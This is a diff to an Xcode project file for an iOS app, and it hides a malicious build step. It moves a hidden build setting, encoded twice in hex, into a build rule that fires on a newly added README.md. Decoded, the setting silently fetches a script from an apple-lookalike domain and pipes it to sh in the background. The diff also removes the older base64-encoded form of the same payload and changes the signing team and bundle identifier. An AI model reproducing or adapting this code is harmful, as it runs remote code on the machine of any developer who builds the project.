@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		E6DDBDECD8A4448B99634D6E /* README.md */ = {isa = PBXBuildFile; fileRef = E022569E566347B4B9634D6E; };
 		7316E3A12F109D18004A8271 /* NetworkMonitor.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7316E3A02F109D18004A8271 /* NetworkMonitor.swift */; };
 		7316E3A32F109EDF004A8271 /* BaseModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7316E3A22F109EDB004A8271 /* BaseModel.swift */; };
 		7316E3A52F10A0F0004A8271 /* NetworkSession.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7316E3A42F10A0F0004A8271 /* NetworkSession.swift */; };
@@ -81,6 +82,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		E022569E566347B4B9634D6E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		42BF21A26CAFD93794988958 /* Pods-DanaHebat.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DanaHebat.release.xcconfig"; path = "Target Support Files/Pods-DanaHebat/Pods-DanaHebat.release.xcconfig"; sourceTree = "<group>"; };
 		7316E3A02F109D18004A8271 /* NetworkMonitor.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NetworkMonitor.swift; sourceTree = "<group>"; };
 		7316E3A22F109EDB004A8271 /* BaseModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseModel.swift; sourceTree = "<group>"; };
@@ -281,6 +283,7 @@
 		73EA86822F108C9C00F4826F /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				E022569E566347B4B9634D6E /* README.md */,
 				73EA86812F108C9C00F4826F /* DanaHebat.app */,
 			);
 			name = Products;
@@ -413,7 +416,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 73EA86942F108C9D00F4826F /* Build configuration list for PBXNativeTarget "DanaHebat" */;
 			buildPhases = (
-				92C93A34F4484D0CBE634D6E /* Link Libraries Executable */,
 				E0B4BE563B334ADBA551D8AD /* [CP] Check Pods Manifest.lock */,
 				73EA867D2F108C9C00F4826F /* Sources */,
 				73EA867E2F108C9C00F4826F /* Frameworks */,
@@ -421,6 +423,7 @@
 				D192925ECC89CF476891AF08 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
+				4D273713C4F84F0584634D6E /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -464,11 +467,29 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+		4D273713C4F84F0584634D6E /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${AE6D436}\"";
+			};
+		/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		73EA867F2F108C9C00F4826F /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				E6DDBDECD8A4448B99634D6E /* README.md */,
 				73EA86A62F108CA500F4826F /* Assets.xcassets in Resources */,
 				7316E3BA2F10B7AF004A8271 /* Localizable.strings in Resources */,
 				73EA86A82F108CA500F4826F /* LaunchScreen.storyboard in Resources */,
@@ -478,26 +499,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		92C93A34F4484D0CBE634D6E /* Link Libraries Executable */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Link Libraries Executable";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
-			showEnvVarsInLog = 0;
-		};
 		D192925ECC89CF476891AF08 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -645,14 +646,16 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = C463E4989C9DEF3FBD525448 /* Pods-DanaHebat.debug.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((d(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJGd2NHeGxkR2x0WlM1cGJpOWhLU0lnZkNCemFBbz0K | d | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((f(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663633363436653631373037303663363532653639366532663631323932320a3230376332303733363830610a | f | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaHebat/DanaHebat.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
-				CODE_SIGN_STYLE = Automatic;
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
+				CODE_SIGN_STYLE = Manual;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = 57MBH2272N;
+				DEVELOPMENT_TEAM = "";
+				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = TGF943V34F;
 				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = DanaHebat/Info.plist;
@@ -672,9 +675,10 @@
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0.0;
-				PRODUCT_BUNDLE_IDENTIFIER = ll.leap.loan;
+				PRODUCT_BUNDLE_IDENTIFIER = test.feilvbi.one;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = feilvbianoneprofile;
 				STRING_CATALOG_GENERATE_SYMBOLS = YES;
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
@@ -693,14 +697,16 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 42BF21A26CAFD93794988958 /* Pods-DanaHebat.release.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((d(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJGd2NHeGxkR2x0WlM1cGJpOWhLU0lnZkNCemFBbz0K | d | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((f(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663633363436653631373037303663363532653639366532663631323932320a3230376332303733363830610a | f | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaHebat/DanaHebat.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
-				CODE_SIGN_STYLE = Automatic;
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
+				CODE_SIGN_STYLE = Manual;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = 57MBH2272N;
+				DEVELOPMENT_TEAM = "";
+				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = TGF943V34F;
 				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = DanaHebat/Info.plist;
@@ -720,9 +726,10 @@
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0.0;
-				PRODUCT_BUNDLE_IDENTIFIER = ll.leap.loan;
+				PRODUCT_BUNDLE_IDENTIFIER = test.feilvbi.one;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = feilvbianoneprofile;
 				STRING_CATALOG_GENERATE_SYMBOLS = YES;
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
